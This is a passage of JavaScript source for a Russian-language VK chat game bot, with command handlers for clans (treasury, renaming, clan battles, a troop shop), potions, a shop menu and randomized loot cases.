if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(user.rank > 4 && user.rank < 7) return context.send(`${nick}, администраторам запрещено ложить деньги в клан.`)
	let res = context.$match[2]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	if(!Number(res)) return context.send(`${nick}, использование: «клан казна [сумма]»`)
	res = Number(res)
	if(res > user.balance) return context.send(`${nick}, недостаточно средств.`)
	user.balance -= Number(res)
	myclan.money += Number(res)
	if(myclan.moneytime[base.id[context.senderId].id]){
		myclan.moneytime[base.id[context.senderId].id].money += Number(res)
	}
	if(!myclan.moneytime[base.id[context.senderId].id]){
		myclan.moneytime[base.id[context.senderId].id] = {
			money: Number(res)
		}
	}
	return context.send(`${nick}, вы успешно пополнили казну клана на ${utils.sp(res)}$`)
})

updates.hear(/(клан изменить)\s(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(myclan.players[base.id[context.senderId].id].rank === 1) return context.send(`${nick}, вы не можете изменять название клана!`)
	if(context.$match[2].length < 3) return context.send(`${nick}, вы указали короткое название. 😔`)
	if(context.$match[2].length > 45) return context.send(`${nick}, вы указали СЛИШКОМ длинное название. 😕`)
	myclan.name = `${context.$match[2]}`
	return context.send(`${nick}, установлено новое название: «${context.$match[2]}»!`)
})

updates.hear(/(клан изменить)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	return context.send(`${nick}, использование: «клан изменить [название]»`)
})

updates.hear(/(клан казна$)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
let moneymoney = []
let text = ``

for(let i in myclan.moneytime){
let rankb = `${myclan.players[i].rank}`

if(rankb == "1") rankb = `🔹`
if(rankb == "2") rankb = `👑`
if(rankb == "3") rankb = `👑`
text += `\n${rankb}[ID ${base.id[myclan.players[i].id].id}] *id${base.bs[base.id[myclan.players[i].id].id].id} (${base.bs[base.id[myclan.players[i].id].id].nick}) вложил ${utils.sp(clan[user.clan].moneytime[base.id[myclan.players[i].id].id].money)}$`
}
if(text === ``) return context.send(`${nick}, сегодня в казну клана никто не вкладывал.`)
return context.send(`${nick}, сегодня вкладывали в казну:${text}`)
})


updates.hear(/клан атака$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.clan === 0){
		return context.send(`
				${nick}, вы не состоите в клане.
				Информация по командам: «клан помощь» 🔔
			`)
}
if(myclan.players[base.id[context.senderId].id].rank < 2) return context.send(`${nick}, атаковать может только админ клана.  🤐`)
if(myclan.attacktimer > 0) return context.send(`${nick}, атаковать можно раз в 10 минут.`)
let finder = 0
let diapazon = myclan.rating
for(let o in clan){
	if(clan[o].id !== myclan.id) {
	if(clan[o].rating > diapazon-Number(1000) && clan[o].rating < diapazon+Number(1000) && clan[o].guard < 1){
		finder = clan[o].id
		
	}
}
}
if(finder == 0) return context.send(`${nick}, не удалось найти подходящий для атаки клан. Пожалуйста, попробуйте снова! 😛`)
myclan.guard = 0
let result = 0
let voiskaone = myclan.bowman
voiskaone += Number(myclan.knight)
let voiskatwo = clan[finder].knight
voiskatwo += Number(clan[finder].bowman)

if(voiskatwo > voiskaone) result = Number(2)
if(voiskaone > voiskatwo) result = Number(1)
if(voiskatwo == voiskaone) return context.send(`${nick}, у вас слишком мало войск. 😛`)
if(result == 2) {
	myclan.knight /= Number(2)
	myclan.bowman /= Number(2)
	myclan.bowman = Math.trunc(myclan.bowman)
	myclan.knight = Math.trunc(myclan.knight)
	if(myclan.knight < 1) myclan.knight = Number(1)
	if(myclan.bowman < 1) myclan.bowman = Number(1)
	myclan.rating -= Number(1)
	myclan.louse += 1
	if(myclan.rating < 1) myclan.rating = Number(0)
	myclan.attacktimer = Number(10)
	let months = new Date().getMonth()
    let days = new Date().getDate()
    let hour = new Date().getHours()
    let minute = new Date().getMinutes()
    let second = new Date().getSeconds()
    minute += Number(10)
    clan[finder].rating += Number(1)
    clan[finder].win += Number(1)
    myclan.attackdate = `${nols(days)}.${nols(months)}.${new Date().getFullYear()} в ${nols(hour)}:${nols(minute)}`
	return context.send(`${nick}, ваш клан потерпел поражение перед «${clan[finder].name}», вы потеряли половину своего войска. ❌`)
}
if(result == 1) {
	myclan.rating += Number(1)
	let grab = clan[finder].money
	let grabx = getRandomInRange(1, 10)
	grab /= Number(grabx)
	grab = Math.trunc(grab)
	clan[finder].money -= Number(grab)
	myclan.money += Number(grab)
	clan[finder].guard = 60
	clan[finder].shielddate = `1 часа.`
	clan[finder].rating -= Number(1)
	clan[finder].louse += Number(1)
	if(clan[finder].rating < 1) clan[finder].rating = Number(0)
	myclan.attacktimer = Number(10)
	let months = new Date().getMonth()
	myclan.win += 1
    let days = new Date().getDate()
    let hour = new Date().getHours()
    let minute = new Date().getMinutes()
    let second = new Date().getSeconds()
    minute += Number(10)
    myclan.attackdate = `${nols(days)}.${nols(months)}.${new Date().getFullYear()} в ${nols(hour)}:${nols(minute)}`
	return context.send(`${nick}, ваш клан одержал победу перед «${clan[finder].name}», украдено: ${utils.sp(grab)}$. ✅`)
}
})

setInterval(function() {
for(let m in clan){
if(clan[m].attacktimer > 0){
	clan[m].attacktimer -= Number(1)
}
}
}, 60000);

updates.hear(/клан магазин 1 (.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.clan === 0){
		return context.send(`
				${nick}, вы не состоите в клане.
				Информация по командам: «клан помощь» 🔔
			`)
}
if(myclan.players[base.id[context.senderId].id].rank < 2) return context.send(`${nick}, распоряжаться казной могут только админы клана.  🤐`)
let res = context.$match[1]
while(res.includes(`к`)) {
	res = res.replace(`к`, `000`)
}
while(res.includes(`k`)) {
	res = res.replace(`k`, `000`)
}
if(!Number(res)) res = Number(1)
if(res < 1) res = Number(1)
let price = Number(10000000000)
price *= Number(res)
if(myclan.money < price) return context.send(`${nick}, в казне клана недостаточно средств.`)
myclan.money -= Number(price)
myclan.knight += Number(res)

return context.send(`${nick}, вы купили ${res} рыцарей за ${utils.sp(price)}$`)


})

updates.hear(/клан магазин 2 (.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.clan === 0){
		return context.send(`
				${nick}, вы не состоите в клане.
				Информация по командам: «клан помощь» 🔔
			`)
}
if(myclan.players[base.id[context.senderId].id].rank < 2) return context.send(`${nick}, распоряжаться казной могут только админы клана.  🤐`)
let res = context.$match[1]
while(res.includes(`к`)) {
	res = res.replace(`к`, `000`)
}
while(res.includes(`k`)) {
	res = res.replace(`k`, `000`)
}
if(!Number(res)) res = Number(1)
if(res < 1) res = Number(1)
let price = Number(15000000000)
price *= Number(res)
if(myclan.money < price) return context.send(`${nick}, в казне клана недостаточно средств.`)
myclan.money -= Number(price)
myclan.bowman += Number(res)

return context.send(`${nick}, вы купили ${res} рыцарей за ${utils.sp(price)}$`)


})

updates.hear(/клан магазин 3$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.clan === 0){
		return context.send(`
				${nick}, вы не состоите в клане.
				Информация по командам: «клан помощь» 🔔
			`)
}
if(myclan.players[base.id[context.senderId].id].rank < 2) return context.send(`${nick}, распоряжаться казной могут только админы клана.  🤐`)
if(myclan.guard > 0) return context.send(`${nick}, у клана уже есть щит. 🤐`)
let price = Number(100000000000)
if(myclan.money < price) return context.send(`${nick}, в казне клана недостаточно средств.`)
myclan.money -= Number(price)
myclan.guard = Number(1440)
    let months = new Date().getMonth()
    let days = new Date().getDate()
    let hour = new Date().getHours()
    let minute = new Date().getMinutes()
    let second = new Date().getSeconds()
    days += Number(1)
    let date = `${nols(days)}.${nols(months)}.${new Date().getFullYear()} ${nols(hour)}:${nols(minute)}`
myclan.shielddate = date
return context.send(`${nick}, ваш клан будет защищен щитом до ${date} за 100,000,000,000$ 💰\n🆘 Внимание! Щит пропадает после каждого нападения.`)


})



updates.hear(/клан магазин$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.clan === 0){
		return context.send(`
				${nick}, вы не состоите в клане.
				Информация по командам: «клан помощь» 🔔
			`)
}
return context.send(`${nick}, магазин:
1⃣ Рыцарь - 10.000.000.000$
2⃣ Лучник - 15.000.000.000$
3⃣ Щит на сутки - 100.000.000.000$
🔎 Купить: «Клан магазин [номер] [количество]»`)


})
updates.hear(/клан$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.clan === 0){
		context.send(`
				${nick}, вы не состоите в клане.
				Информация по командам: «клан помощь» 🔔
			`)
	} else {
		context.send(`
				${nick}, информация о клане «${myclan.name}»:

				📜 ID клана: ${myclan.id}
				👑 Рейтинг клана: ${myclan.rating}
				💰 В казне клана: ${utils.sp(myclan.money)}$
				⚔ В клане состоит: ${myclan.player}/50 участников
				🥇 Побед: ${myclan.win}, поражений: ${myclan.louse}
				☠ На вас нападало: ${myclan.attackyou} кланов.

				${myclan.guard !== 0 ? `🔒 Щит защищает до ${myclan.shielddate}` : ""}
				🗡 Рыцарей: ${myclan.knight}
				🏹 Лучников: ${myclan.bowman}

				👑 Создатель клана: *id${base.bs[myclan.owner].id} (${base.bs[myclan.owner].nick})
			`)
	}
})

updates.hear(/(клан)\s(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, информация по командам:
		1⃣ Клан — информация о клане.
2⃣ Клан создать [название] — стоимость 100.000.000.000$
3⃣ Клан удалить — распустить клан.
4⃣ Клан пригласить [ID игрока] — пригласить игрока в клан.
5⃣ Клан исключить [ID игрока] — исключить игрока из клана.
6⃣ Клан выйти — выйти из клана.
7⃣ Клан вступить [ID клана] — принять приглашение в клан.
8⃣ Клан топ — рейтинг кланов.
9⃣ Клан казна — история пополнения казны за сутки.
🔟 Клан казна [сумма] — внести деньги в казну клана.
1⃣1⃣ Клан изменить [название] — сменить название.
1⃣2⃣ Клан состав — участники клана.
1⃣3⃣ Клан магазин — покупка войск для клана.
1⃣4⃣ Клан атака — напасть на другой клан.
1⃣5⃣ Клан админ [ID игрока] — выдать админа в клане.
1⃣6⃣ Клан снять [ID игрока] — снять админа в клане.`)
})


updates.hear(/зелья 1$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.potioneffecttime > 0) return context.send(`${nick}, нельзя одновременно выпивать несколько зелий. Выпейте молоко чтобы избавиться от эффекта. 🍼`)
	if(user.balance < Number(1000000000000)) return context.send(`${nick}, вам нужно 1.000.000.000.000$ для покупки зелья. 😳`)
	user.balance -= Number(1000000000000)
	user.potioneffect = Number(1)
	user.potioneffecttime = Number(10)
	return context.send(`${nick}, вы успешно выпили "Зелье удачи" за 1.000.000.000.000$ 🍹`)
	})
	
updates.hear(/зелья 2$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, временно недоступно.`)
	if(user.potioneffecttime > 0) return context.send(`${nick}, нельзя одновременно выпивать несколько зелий. Выпейте молоко чтобы избавиться от эффекта. 🍼`)
	if(user.balance < Number(1000000000000)) return context.send(`${nick}, вам нужно 1.000.000.000.000$ для покупки зелья. 😳`)
	user.balance -= Number(1000000000000)
	user.potioneffect = Number(1)
	user.potioneffecttime = Number(10)
	return context.send(`${nick}, вы успешно выпили "Зелье удачи" за 1.000.000.000.000$ 🍹`)
	})
	
	updates.hear(/зелья 3$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.potioneffecttime > 0) return context.send(`${nick}, нельзя одновременно выпивать несколько зелий. Выпейте молоко чтобы избавиться от эффекта. 🍼`)
	if(user.balance < Number(50000000000)) return context.send(`${nick}, вам нужно 50.000.000.000$ для покупки зелья. 😳`)
	user.balance -= Number(50000000000)
	user.potioneffect = Number(3)
	user.potioneffecttime = Number(5)
	return context.send(`${nick}, вы успешно выпили "Зелье неудачи" за 50.000.000.000$ 🍹`)
	})
	updates.hear(/зелья 4$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.balance < Number(1000000000)) return context.send(`${nick}, вам нужно 1.000.000.000$ для покупки молока. 😳`)
	user.balance -= Number(1000000000)
	user.potioneffect = Number(0)
	user.potioneffecttime = Number(0)
	return context.send(`${nick}, вы успешно выпили "Молоко" за 1.000.000.000$ 🍼`)
	})
	
updates.hear(/зелья$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, список зелий:
 
🍀 Зелье удачи на 10 минут (1.000.000.000.000$)
🛒 Купить: "зелья 1"

⚒ Зелье шахтера на 1 час (100.000.000.000$)
🛒 Купить: "зелья 2" (временно недоступно)

❌ Зелье неудачи на 5 минут (50.000.000.000$)
🛒 Купить: "зелья 3"

🥛 Молоко против зелья (1.000.000.000$)
🛒 Купить: "зелья 4"`)
	
	
	})
updates.hear(/магазин$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
text = `${nick}, разделы магазина:
🚙 Транспорт:
⠀⠀🚗 Машины
⠀⠀🛥 Яхты
⠀⠀🛩 Самолеты
⠀⠀🚁 Вертолеты

🏘 Недвижимость:
⠀⠀🏠 Дома
⠀⠀🌇 Квартиры

📌 Остальное:
⠀⠀📱 Телефоны
⠀⠀🔋 Фермы
⠀⠀👑 Рейтинг [кол-во] - 250 млн$
⠀⠀💼 Бизнесы [1/2]
⠀⠀🌐 Биткоин [кол-во]

🔎 Для покупки используйте «[категория] [номер]».
⠀ ⠀ Например: «Вертолеты 2»`

return context.send({message: `${text}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📒 Профиль', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💲 Баланс', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '👑 Рейтинг', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🛍 Магазин', 
            color: Keyboard.PRIMARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💸 Продать', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🏆 Топ', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      	[
      	Keyboard.textButton({ 
        label: '🤝 Передать', 
        color: Keyboard.SECONDARY_COLOR,
        }),
        Keyboard.textButton({ 
        label: '💰 Банк', 
        color: Keyboard.SECONDARY_COLOR,
        }),
        Keyboard.textButton({ 
        label: '◀ В главное меню', 
        color: Keyboard.SECONDARY_COLOR,
        })

        ]
     ])
     .inline(platform)
  })
	})
	
	updates.hear(/кейс открыть 1$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.suprcase < Number(1)) return context.send(`${nick}, у Вас нет "Сюрприз Кейса"! 🙄`)
	user.suprcase -= Number(1)
	let type = getRandomInRange(1, 3)
	if(type == 1) {
		let plus = getRandomInRange(10, 250)
		user.exp += Number(plus)
		return context.send({message: `${nick}, вы нашли ${utils.sp(plus)} опыта. 🔥`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({
            label: '📦 Кейс открыть 1', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
	if(type == 2) {
		let plus = getRandomInRange(1, 9)
		user.rating += Number(plus)
		return context.send({message: `${nick}, вы нашли ${utils.sp(plus)} рейтинга. 👑`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 1', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
	if(type == 3) {
		let plus = getRandomInRange(25000000000 , 70000000000)
		user.balance += Number(plus)
		return context.send({message: `${nick}, вы нашли ${utils.sp(plus)}$. 🤑`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 1', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
})
	

	updates.hear(/кейс 2 (.*)/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
		}
    if(!Number(res)) return context.send(`${nick}, используй: «кейс 1 кол-во» 👀`)

	let colvo = Number(res)
	let price = 3000000000000
    price *= Number(colvo)
if(user.balance < price) return context.send(`${nick}, у Вас недостаточно денег 😮`)
user.balance -= Number(price)
user.platcase += Number(colvo) 

	return context.send({message: `${nick}, вы успешно купили "Платинум Кейс" (x${colvo}) 💰`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 2', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
})
	
updates.hear(/кейс 1 (.*)/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
		}
    if(!Number(res)) return context.send(`${nick}, используй: «кейс 1 кол-во» 👀`)
	let colvo = Number(res)
	let price = 50000000000
    price *= Number(colvo)
if(user.balance < price) return context.send(`${nick}, у Вас недостаточно денег 😮`)
user.balance -= Number(price)
user.suprcase += Number(colvo) 

	return context.send({message: `${nick}, вы успешно купили "Сюрприз Кейс" (x${colvo}) 💰`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 1', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
  })
updates.hear(/кейс 2$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, используй: «кейс 1 кол-во» 👀`)
	
})

updates.hear(/кейс 1$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, используй: «кейс 1 кол-во» 👀`)
	
})

updates.hear(/кейс инфо 1$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, из "Сюрприз Кейса" может выпасть: 

1⃣ Опыт.
2⃣ Игровая валюта.
3⃣ Рейтинг.

🛒 Купить: "кейс 1 [кол-во]"`)
	
})
updates.hear(/кейс инфо 2$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, из "Платинум Кейса" может выпасть: 

1⃣ Опыт.
2⃣ Игровая валюта.
3⃣ Рейтинг.
4️⃣ Биткоины.
5️⃣ Фермы.

🛒 Купить: "кейс 2 [кол-во]"`)
	
})

updates.hear(/кейс открыть 2$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.platcase < Number(1)) return context.send(`${nick}, у Вас нет "Платинум Кейса"! 🙄`)
	user.platcase -= Number(1)
	let type = getRandomInRange(1, 5)
	if(type == 1) {
		let plus = getRandomInRange(100, 1000)
		user.exp += Number(plus)
		return context.send({message: `${nick}, вы нашли ${plus} опыта. 🔥`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 2', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
	if(type == 2) {
		let plus = getRandomInRange(50, 20000)
		user.rating += Number(plus)
		return context.send({message: `${nick}, вы нашли ${plus} рейтинга. 👑`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 2', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
	if(type == 3) {
		let plus = getRandomInRange(1000000000000, 3500000000000)
		user.balance += Number(plus)
		return context.send({message: `${nick}, вы нашли ${utils.sp(plus)}$. 🤑`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 2', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
	if(type == 4) {
		let plus = getRandomInRange(10000, 2500000)
		user.btc += Number(plus)
		
		return context.send({message: `${nick}, вы нашли ${utils.sp(plus)}₿. 🙂`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 2', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
	if(type == 5) {
		let plus = getRandomInRange(1, 100)
		user.farms += Number(plus)
		return context.send({message: `${nick}, вы нашли ${utils.sp(plus)}🔋 ферм. 🙂`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📦 Кейс открыть 2', 
            color: Keyboard.POSITIVE_COLOR,
            })           
      ]
     ])
     .inline(true)
  })
	}
})
	

updates.hear(/кейсы$/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let invshow = ``
let inv = ``
if(user.suprcase > 0) {
	invshow = `👜 У Вас в инвентаре:`
	inv += `\n📦 Сюрприз Кейс (${utils.sp(user.suprcase)} шт.)
📜 Открыть: «кейс открыть 1» `
}
if(user.platcase > 0) {
	invshow = `👜 У Вас в инвентаре:`
	inv += `\n📦 Платинум Кейс (${utils.sp(user.platcase)} шт.)
📜 Открыть: «кейс открыть 2» `
}
return context.send(`${nick}, кейсы: 

1⃣ Сюрприз Кейс: 50.000.000.000$ 
📜 Информация: "кейс инфо 1" 
🛒 Купить: "кейс 1 [кол-во]" 

2⃣ Платинум Кейс: 3.000.000.000.000$ 
📜 Информация: "кейс инфо 2" 
🛒 Купить: "кейс 2 [кол-во]" 

${invshow}
${inv} `)
	
})

updates.hear(/getid (.*)$/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
